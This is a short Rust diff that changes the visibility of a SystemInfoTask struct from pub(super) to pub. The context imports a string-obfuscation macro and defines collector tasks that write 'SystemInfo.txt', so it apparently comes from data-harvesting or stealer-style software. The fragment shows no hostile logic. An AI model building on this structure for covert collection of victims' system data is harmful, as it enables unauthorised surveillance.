@@ -33,7 +33,7 @@ use obfstr::obfstr as s;
 use tasks::{Task, parent_name};
 use utils::process;
 
-pub(super) struct SystemInfoTask;
+pub struct SystemInfoTask;
 
 impl<C: Collector, F: FileSystem> Task<C, F> for SystemInfoTask {
     parent_name!("SystemInfo.txt");
